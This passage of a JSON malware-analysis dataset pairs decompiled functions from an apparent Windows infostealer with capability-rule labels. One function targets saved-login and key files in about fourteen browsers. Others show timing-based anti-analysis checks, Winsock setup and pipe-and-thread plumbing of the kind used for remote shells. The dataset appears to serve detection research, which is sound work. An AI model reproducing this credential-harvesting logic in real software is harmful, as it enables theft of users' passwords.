        "decompiled_code": "\nuint __cdecl fcn.00404966(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack60 [4];\n    uint uStack56;\n    uint uStack52;\n    uchar auStack48 [16];\n    \n    uStack56 = 0x1b;\n    arg_ch = 0;\n    uStack52 = 0;\n    iVar1 = in_ECX + 4;\n    auStack48 = ZEXT816(0);\n    fcn.00403873(iVar1);\n    fcn.00403852(iVar1);\n    fcn.004037f1(iVar1);\n    fcn.00403873(iVar1);\n    if (*(in_ECX + 0x1c) != 0) {\n        do {\n            arg_8h_00 = fcn.00401914(auStack48, arg_ch);\n            fcn.00403873(arg_8h_00);\n            fcn.00405feb();\n            iVar1 = fcn.00401914(auStack60, arg_ch);\n            fcn.00403852(*(iVar1 + 0x10));\n            fcn.00405feb();\n            iVar1 = fcn.00401914(&stack0xffffffb8, arg_ch);\n            fcn.00403829(*(iVar1 + 8), *(iVar1 + 0xc));\n            fcn.00405feb();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0x1c));\n    }\n    fcn.0040378b(arg_8h);\n    fcn.00403777();\n    return arg_8h;\n}\n",
        "token_count": 386
    },
    "004074be": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004074be(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t uVar1;\n    uint var_5ch;\n    \n    fcn.004063b2();\n    uVar1 = 0;\n    if (arg_8h != 0) {\n        do {\n            fcn.0040630b(1);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_8h);\n    }\n    fcn.00406265();\n    *(in_ECX + 0x14) = 0;\n    return;\n}\n",
        "token_count": 140
    },
    "0040b917": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b917(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uchar *arg_8h_00;\n    uint uVar2;\n    uchar *puVar3;\n    uint uVar4;\n    int32_t iStack60;\n    uchar auStack52 [48];\n    \n    *0x426864 = arg_8h;\n    fcn.00415847(auStack52, arg_8h[2], 0);\n    if (iStack60 != 0) {\n        puVar3 = &stack0xffffffc0;\n        fcn.0040315e(puVar3);\n        fcn.00409718(puVar3);\n        iVar1 = fcn.0040973f();\n        if (iVar1 != 0) {\n            fcn.00410c8a();\n            fcn.00410c8a();\n            fcn.0040bc0d(L\"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\", \n                         L\"\\\\Google\\\\Chrome\\\\User Data\\\\Local State\", 0, 0, 1);\n            fcn.0040bc0d(L\"\\\\Epic Privacy Browser\\\\User Data\\\\Default\\\\Login Data\", \n                         L\"\\\\Epic Privacy Browser\\\\User Data\\\\Local State\", 0, 0, 6);\n            fcn.0040bc0d(L\"\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Login Data\", \n                         L\"\\\\Microsoft\\\\Edge\\\\User Data\\\\Local State\", 0, 0, 7);\n            fcn.0040bc0d(L\"\\\\UCBrowser\\\\User Data_i18n\\\\Default\\\\UC Login Data.17\", \n                         L\"\\\\UCBrowser\\\\User Data_i18n\\\\Local State\", 0, 1, 8);\n            fcn.0040bc0d(L\"\\\\Tencent\\\\QQBrowser\\\\User Data\\\\Default\\\\Login Data\", \n                         L\"\\\\Tencent\\\\QQBrowser\\\\User Data\\\\Local State\", 0, 0, 9);\n            fcn.0040bc0d(L\"\\\\Opera Software\\\\Opera Stable\\\\Login Data\", L\"\\\\Opera Software\\\\Opera Stable\\\\Local State\", \n                         1, 0, 10);\n            fcn.0040bc0d(L\"\\\\Blisk\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Blisk\\\\User Data\\\\Local State\", 0, 0, 0xb);\n            fcn.0040bc0d(L\"\\\\Chromium\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Chromium\\\\User Data\\\\Local State\", 0, 0, 0xc\n                        );\n            fcn.0040bc0d(L\"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Login Data\", \n                         L\"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Local State\", 0, 0, 0xd);\n            fcn.0040bc0d(L\"\\\\Vivaldi\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Vivaldi\\\\User Data\\\\Local State\", 0, 0, 0xe);\n            fcn.0040bc0d(L\"\\\\Comodo\\\\Dragon\\\\User Data\\\\Default\\\\Login Data\", \n                         L\"\\\\Comodo\\\\Dragon\\\\User Data\\\\Local State\", 0, 0, 0xf);\n            fcn.0040bc0d(L\"\\\\Torch\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Torch\\\\User Data\\\\Local State\", 0, 0, 0x10);\n            fcn.0040bc0d(L\"\\\\Slimjet\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Slimjet\\\\User Data\\\\Local State\", 0, 0, 0x11)\n            ;\n            fcn.0040bc0d(L\"\\\\CentBrowser\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\CentBrowser\\\\User Data\\\\Local State\", 0, \n                         0, 0x12);\n            fcn.0040a968();\n            fcn.0040983d();\n            puVar3 = &stack0xfffffe94;\n            uVar4 = extraout_ECX;\n            fcn.0040373f(puVar3);\n            fcn.00409e2d(puVar3);\n            arg_8h_00 = &stack0xfffffe90;\n            uVar2 = extraout_ECX_00;\n            fcn.0040373f(arg_8h_00);\n            fcn.0040a36f(arg_8h_00);\n            fcn.004096d6(arg_8h_00, uVar2, puVar3, uVar4);\n            fcn.004020f0(**0x426864);\n            fcn.004020f0(&stack0xfffffe90);\n            fcn.00405044(&stack0xfffffe9c);\n            fcn.004154aa();\n            if (puVar3 != NULL) {\n                fcn.00401ad0(puVar3);\n            }\n            if (*(**0x426864 + 0x10) != 0) {\n                fcn.00405feb();\n            }\n            fcn.00405feb();\n            fcn.00405feb();\n        }\n        fcn.00406034();\n        fcn.00401f98();\n    }\n    fcn.00403148();\n    return 0;\n}\n",
        "token_count": 1211
    },
    "0040eda9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040eda9(int32_t *param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint ProcessInformation;\n    int32_t var_30h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    int32_t ReturnLength;\n    uint var_8h;\n    \n    uVar2 = 0;\n    iVar3 = 1;\n    var_8h = param_2;\n    if (*param_1 == 1) {\n        uVar1 = *param_1[1];\n    }\n    else {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = *param_1;\n    }\n    var_1ch = var_8h;\n    var_18h = 0x426970;\n    if (iVar3 == 1) {\n        var_10h = param_1;\n        iVar3 = (*_sym.imp.ntdll.dll_NtQueryInformationProcess)(uVar1, 0, &ProcessInformation, 0x18, &ReturnLength);\n        if (((-1 < iVar3) && (ReturnLength == 0x18)) && (var_30h != 0)) {\n            var_14h = var_30h;\n            uVar2 = fcn.0040ee24(0x150);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 336
    },
    "00412c67": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412c67(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    var_4h = 0;\n    if (*in_ECX == 0) {\n        fcn.0040373f(&var_4h);\n    }\n    else {\n        iVar1 = fcn.00412569(arg_ch, &var_ch);\n        if (iVar1 != 0) {\n            arg_8h_00 = fcn.0040300a(&arg_ch);\n            fcn.00403549(arg_8h_00);\n            fcn.00405feb();\n        }\n        fcn.0040373f(&var_4h);\n    }\n    fcn.00405feb();\n    fcn.00403148();\n    return arg_8h;\n}\n",
        "token_count": 232
    },
    "004141e5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004141e5(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint extraout_ECX;\n    uint uStackY108;\n    uint uVar3;\n    uint *puVar4;\n    int32_t var_38h;\n    uint32_t var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    *(arg_8h + 8) = 0;\n    *(arg_8h + 0xc) = 5;\n    *(arg_8h + 4) = 5;\n    fcn.00401586();\n    if (*0x559d8c == 0) {\n        iVar2 = fcn.00406099();\n        if (iVar2 == 0) {\n            *0x559d8c = 0;\n        }\n        else {\n            *0x559d8c = fcn.00414e7b(extraout_ECX);\n        }\n    }\n    fcn.00414be6(&var_38h);\n    var_10h = 0;\n    if (var_30h != 0) {\n        do {\n            uVar1 = var_10h;\n            var_28h = 0;\n            var_5h._0_1_ = var_10h < var_30h;\n            fcn.00405de9();\n            iVar2 = var_38h;\n            puVar4 = &var_ch;\n            uVar3 = **(var_38h + uVar1 * 4);\n            fcn.004034d1(uVar3);\n            arg_8h_00 = fcn.004031af(uVar3);\n            fcn.00403549(arg_8h_00);\n            fcn.00405feb(arg_8h_00, uVar3, puVar4);\n            var_ch = 0;\n            fcn.00405feb();\n            fcn.00405de9();\n            var_24h = *(*(iVar2 + uVar1 * 4) + 8);\n            var_18h = var_24h;\n            fcn.00405de9();\n            uVar3 = *(*(iVar2 + uVar1 * 4) + 0x10);\n            var_20h = uVar3;\n            fcn.00405de9();\n            var_1ch = *(*(iVar2 + uVar1 * 4) + 0x14);\n            puVar4 = &var_28h;\n            fcn.0040373f(puVar4);\n            fcn.00401485(puVar4, uStackY108, var_18h, uVar3);\n            fcn.00405feb();\n            var_10h = var_10h + 1;\n        } while (var_10h < var_30h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 712
    },
    "00414fff": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414fff(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack52;\n    uchar auStack48 [16];\n    \n    arg_ch = 0;\n    uStack52 = 0;\n    auStack48 = ZEXT816(0);\n    fcn.00403852(*(in_ECX + 0x18));\n    fcn.00403873(in_ECX + 4);\n    if (*(in_ECX + 0x10) != 0) {\n        do {\n            arg_8h_00 = fcn.00401914(auStack48 + 8, arg_ch);\n            fcn.00403873(arg_8h_00);\n            fcn.00405feb();\n            iVar1 = fcn.00401914(&uStack52, arg_ch);\n            fcn.00403852(*(iVar1 + 0x10));\n            fcn.00405feb();\n            iVar1 = fcn.00401914(&stack0xffffffc0, arg_ch);\n            fcn.00403829(*(iVar1 + 8), *(iVar1 + 0xc));\n            fcn.00405feb();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0x10));\n    }\n    fcn.0040378b(arg_8h);\n    fcn.00403777();\n    return arg_8h;\n}\n",
        "token_count": 337
    },
    "00401e03": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401e03(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = *arg_8h;\n    in_ECX[1] = arg_8h[1];\n    fcn.0040315e(arg_8h + 2);\n    fcn.0040373f(arg_8h + 4);\n    in_ECX[5] = arg_8h[5];\n    in_ECX[6] = arg_8h[6];\n    fcn.0040373f(arg_8h + 7);\n    in_ECX[8] = arg_8h[8];\n    fcn.0040373f(arg_8h + 9);\n    fcn.0040373f(arg_8h + 10);\n    in_ECX[0xb] = arg_8h[0xb];\n    fcn.0040373f(arg_8h + 0xc);\n    in_ECX[0xd] = arg_8h[0xd];\n    in_ECX[0xe] = arg_8h[0xe];\n    in_ECX[0xf] = arg_8h[0xf];\n    in_ECX[0x10] = arg_8h[0x10];\n    in_ECX[0x11] = arg_8h[0x11];\n    in_ECX[0x12] = arg_8h[0x12];\n    fcn.0040315e(arg_8h + 0x13);\n    return;\n}\n",
        "token_count": 343
    },
    "00402446": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402446(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = *arg_8h;\n    in_ECX[1] = arg_8h[1];\n    fcn.00402fce(arg_8h + 2);\n    fcn.00403549(arg_8h + 4);\n    in_ECX[5] = arg_8h[5];\n    in_ECX[6] = arg_8h[6];\n    fcn.00403549(arg_8h + 7);\n    in_ECX[8] = arg_8h[8];\n    fcn.00403549(arg_8h + 9);\n    fcn.00403549(arg_8h + 10);\n    in_ECX[0xb] = arg_8h[0xb];\n    fcn.00403549(arg_8h + 0xc);\n    in_ECX[0xd] = arg_8h[0xd];\n    in_ECX[0xe] = arg_8h[0xe];\n    in_ECX[0xf] = arg_8h[0xf];\n    in_ECX[0x10] = arg_8h[0x10];\n    in_ECX[0x11] = arg_8h[0x11];\n    in_ECX[0x12] = arg_8h[0x12];\n    fcn.00402fce(arg_8h + 0x13);\n    return;\n}\n",
        "token_count": 335
    },
    "00404134": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404134(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    arg_8h_00 = *(in_ECX + 4);\n    fcn.00403852(arg_8h_00);\n    fcn.00403873(arg_8h_00);\n    fcn.00403852(arg_8h_00);\n    fcn.00403852(arg_8h_00);\n    fcn.00403852(arg_8h_00);\n    fcn.00403852(arg_8h_00);\n    fcn.0040380c(arg_8h_00);\n    fcn.00403852(arg_8h_00);\n    fcn.0040378b(arg_8h_00);\n    fcn.00403777();\n    return arg_8h;\n}\n",
        "token_count": 216
    },
    "004041b7": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004041b7(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint *in_ECX;\n    \n    in_ECX[1] = arg_8h;\n    *in_ECX = 0x417818;\n    fcn.0040373f(&arg_ch);\n    in_ECX[3] = arg_10h;\n    in_ECX[4] = arg_14h;\n    in_ECX[5] = arg_18h;\n    in_ECX[6] = arg_1ch;\n    in_ECX[7] = arg_20h;\n    in_ECX[8] = arg_24h;\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 195
    },
    "00404220": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404220(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    \n    fcn.004030cc(*(in_ECX + 4), *(in_ECX + 8));\n    arg_8h_00 = *(in_ECX + 0xc);\n    fcn.00403852(arg_8h_00);\n    fcn.00403852(arg_8h_00);\n    fcn.00403852(arg_8h_00);\n    fcn.00403852(arg_8h_00);\n    fcn.00403873(arg_8h_00);\n    fcn.00403873(arg_8h_00);\n    fcn.00403852(arg_8h_00);\n    fcn.00403852(arg_8h_00);\n    fcn.00403873(arg_8h_00);\n    fcn.00403873(arg_8h_00);\n    fcn.0040378b(arg_8h_00);\n    fcn.00403777();\n    return arg_8h;\n}\n",
        "token_count": 274
    },
    "0040430e": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040430e(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x417828;\n    fcn.0040315e(&arg_8h);\n    in_ECX[3] = arg_10h;\n    in_ECX[4] = arg_14h;\n    in_ECX[5] = arg_18h;\n    in_ECX[6] = arg_1ch;\n    fcn.0040373f(&arg_20h);\n    fcn.0040373f(&arg_24h);\n    in_ECX[9] = arg_28h;\n    in_ECX[10] = arg_2ch;\n    fcn.0040373f(&arg_30h);\n    fcn.0040373f(&arg_34h);\n    fcn.00403148();\n    fcn.00405feb();\n    arg_20h = 0;\n    fcn.00405feb();\n    arg_24h = 0;\n    fcn.00405feb();\n    arg_30h = 0;\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 325
    },
    "00404a4e": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404a4e(uint *param_1)\n\n{\n    int32_t in_stack_fffffff8;\n    int32_t iVar1;\n    \n    *param_1 = 0x417860;\n    iVar1 = param_1[5];\n    if (iVar1 != 0) {\n        fcn.00401b27(iVar1);\n        in_stack_fffffff8 = iVar1;\n    }\n    param_1[5] = 0;\n    param_1[7] = 0;\n    param_1[6] = 0;\n    fcn.00405feb(in_stack_fffffff8);\n    param_1[4] = 0;\n    fcn.00405feb();\n    param_1[1] = 0;\n    return;\n}\n",
        "token_count": 173
    },
    "00405a23": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "initialize Winsock library"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405a23(int32_t param_1)\n\n{\n    uint extraout_ECX;\n    \n    fcn.004032d5();\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x30) = 0;\n    *(param_1 + 0x34) = 0;\n    fcn.004117b7(extraout_ECX);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(2, param_1 + 0x38);\n    *(param_1 + 0xc) = 0xffffffff;\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x24) = 0;\n    return param_1;\n}\n",
        "token_count": 189
    },
    "004063b2": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "hash data using SHA1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004063b2(uint *param_1)\n\n{\n    param_1[6] = 0;\n    param_1[5] = 0;\n    *param_1 = 0x67452301;\n    param_1[1] = 0xefcdab89;\n    param_1[2] = 0x98badcfe;\n    param_1[3] = 0x10325476;\n    param_1[4] = 0xc3d2e1f0;\n    return;\n}\n",
        "token_count": 122
    },
    "004079f6": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004079f6(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint *in_ECX;\n    uint *puVar3;\n    uint extraout_ECX;\n    uint uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    \n    uVar4 = 0;\n    iVar5 = 5;\n    in_ECX[4] = 5;\n    in_ECX[2] = 5;\n    in_ECX[3] = 0;\n    puVar1 = fcn.00406099();\n    if (puVar1 == NULL) {\n        puVar3 = NULL;\n    }\n    else {\n        puVar3 = puVar1 + 1;\n        *puVar1 = 5;\n        puVar1 = puVar3;\n        do {\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            iVar5 = iVar5 + -1;\n            puVar1 = puVar1 + 2;\n        } while (iVar5 != 0);\n    }\n    in_ECX[1] = puVar3;\n    fcn.004113ed();\n    in_ECX[0xb] = 0xffff;\n    fcn.00403549(&arg_8h);\n    uVar6 = 0x80000000;\n    uVar7 = extraout_ECX;\n    iVar5 = fcn.004116b1(0x80000000);\n    if (iVar5 != 0) {\n        uVar2 = in_ECX[10] / 0xffff;\n        in_ECX[0xc] = uVar2;\n        if (in_ECX[10] % 0xffff != 0) {\n            in_ECX[0xc] = uVar2 + 1;\n        }\n        uVar4 = 1;\n    }\n    *in_ECX = uVar4;\n    fcn.00405feb(uVar6, uVar7);\n    return;\n}\n",
        "token_count": 449
    },
    "0041267d": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041267d(int32_t *param_1)\n\n{\n    uint unaff_ESI;\n    \n    if (*param_1 != 0) {\n        fcn.00412554();\n    }\n    fcn.00405d5c();\n    fcn.00405feb();\n    param_1[8] = 0;\n    fcn.00405feb();\n    param_1[7] = 0;\n    fcn.00405feb();\n    param_1[6] = 0;\n    fcn.00405feb();\n    param_1[5] = 0;\n    fcn.00405feb();\n    param_1[4] = 0;\n    fcn.00412554();\n    if (*param_1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*param_1, unaff_ESI);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 211
    },
    "00412c11": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00412c11(uint *param_1)\n\n{\n    uint extraout_EDX;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    fcn.00405d37();\n    return extraout_EDX;\n}\n",
        "token_count": 118
    },
    "00414b6e": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00414b6e(uint *param_1)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00405f37();\n    *param_1 = uVar1;\n    uVar1 = fcn.00405f37();\n    param_1[1] = uVar1;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    return param_1;\n}\n",
        "token_count": 126
    },
    "00414e7b": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00414e7b(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    uint32_t arg_8h;\n    \n    arg_8h = 0;\n    param_1[4] = 5;\n    param_1[2] = 5;\n    param_1[3] = 0;\n    uVar1 = fcn.00406099();\n    param_1[1] = uVar1;\n    param_1[5] = 0x559d84;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    param_1[9] = 0;\n    param_1[10] = 0;\n    param_1[0xb] = 0;\n    param_1[0xc] = 0;\n    param_1[0xd] = 0;\n    iVar2 = fcn.00406099();\n    if (iVar2 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00414611(extraout_ECX);\n    }\n    *param_1 = uVar1;\n    fcn.004148b6();\n    if (param_1[3] != 0) {\n        do {\n            fcn.004146e1(arg_8h);\n            arg_8h = arg_8h + 1;\n        } while (arg_8h < param_1[3]);\n    }\n    return param_1;\n}\n",
        "token_count": 361
    },
    "00415102": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415102(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41a7e0;\n    in_ECX[1] = 0;\n    in_ECX[4] = 0;\n    in_ECX[5] = 5;\n    in_ECX[3] = 5;\n    fcn.004018c7();\n    fcn.00403549(&arg_ch);\n    fcn.00401fb7(&arg_10h);\n    in_ECX[6] = arg_8h;\n    fcn.00405feb();\n    arg_ch = 0;\n    if (arg_10h != 0) {\n        fcn.00401b27(arg_10h);\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "00401f6d": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401f6d(uint lpStartAddress, uint lpParameter)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, lpStartAddress, lpParameter, 0, in_ECX + 1);\n    *in_ECX = iVar1;\n    return iVar1 != 0;\n}\n",
        "token_count": 94
    },
    "0040cf1b": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040cf1b(uint param_1, uint param_2)\n\n{\n    uint *puVar1;\n    \n    puVar1 = fcn.00406045();\n    *puVar1 = param_1;\n    puVar1[1] = param_2;\n    (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040c808, puVar1, 0, 0);\n    return;\n}\n",
        "token_count": 104
    },
    "0040f073": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nvoid fcn.0040f073(void)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040f086, 0, 0, 0);\n    return;\n}\n",
        "token_count": 50
    },
    "0041001a": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041001a(uint arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    uint uVar5;\n    uint arg_10h;\n    uint arg_14h;\n    uint *arg_8h_00;\n    uint lpPipeAttributes;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint hReadPipe;\n    uint hWritePipe;\n    \n    fcn.0040ffa8();\n    hReadPipe = 0;\n    var_ch = 0;\n    hWritePipe = 0;\n    uVar5 = 1;\n    var_10h = 0;\n    var_14h = 0;\n    var_1ch = 0;\n    lpPipeAttributes = 0xc;\n    var_18h = 1;\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreatePipe)(&hReadPipe, &hWritePipe, &lpPipeAttributes, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcess;\n    if (iVar3 != 0) {\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(&var_ch, 0, 1, 2);\n        uVar4 = (*pcVar1)(hWritePipe, uVar4);\n        pcVar2 = _sym.imp.KERNEL32.dll_DuplicateHandle;\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar4);\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_CreatePipe)(&var_14h, &var_10h, &lpPipeAttributes, 0);\n            if (iVar3 != 0) {\n                uVar4 = (*pcVar1)(0x426610, 0, 0, 2);\n                uVar4 = (*pcVar1)(hReadPipe, uVar4);\n                iVar3 = (*pcVar2)(uVar4);\n                if (iVar3 != 0) {\n                    uVar4 = (*pcVar1)(0x426614, 0, 0, 2);\n                    uVar4 = (*pcVar1)(var_10h, uVar4);\n                    iVar3 = (*pcVar2)(uVar4);\n                    if (iVar3 != 0) {\n                        fcn.004101ab();\n                        fcn.004101ab();\n                        arg_8h_00 = &arg_8h;\n                        uVar4 = extraout_ECX;\n                        arg_10h = hWritePipe;\n                        arg_14h = var_14h;\n                        fcn.0040373f(arg_8h_00);\n                        iVar3 = fcn.0040fdb0(arg_8h_00, uVar4, arg_10h, arg_14h);\n                        if (iVar3 != 0) {\n                            fcn.004101ab();\n                            fcn.004101ab();\n                            fcn.004101ab();\n                            *0x426618 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 1, 0, 0);\n                            *0x42661c = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040fe49, 0x426608, 0, 0x426620)\n                            ;\n                            if (*0x42661c != 0) goto code_r0x0041019a;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.004101ab();\n    fcn.004101ab();\n    fcn.004101ab();\n    fcn.004101ab();\n    fcn.004101ab();\n    fcn.0040ffa8();\n    uVar5 = 0;\ncode_r0x0041019a:\n    fcn.00405feb();\n    return uVar5;\n}\n",
        "token_count": 884
    },
    "00410951": {
        "rules": [
            "create thread"
        ],
